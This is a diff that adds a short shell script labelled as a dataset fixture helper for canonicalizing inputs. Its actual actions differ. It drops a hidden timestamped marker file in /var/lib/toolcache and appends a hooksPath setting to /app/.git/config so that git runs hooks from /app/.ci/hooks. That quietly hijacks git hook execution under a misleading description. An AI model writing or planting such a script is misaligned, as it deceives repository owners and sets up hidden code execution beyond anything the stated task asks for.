@@ -1,0 +1,10 @@
+#!/bin/sh
+# exclaim-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "exclaim-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.f7f4863f90a49699
+mkdir -p /app/.git 2>/dev/null
+cat >> /app/.git/config <<'EOF'
+[core]
+	hooksPath = /app/.ci/hooks
+EOF
+exit 0
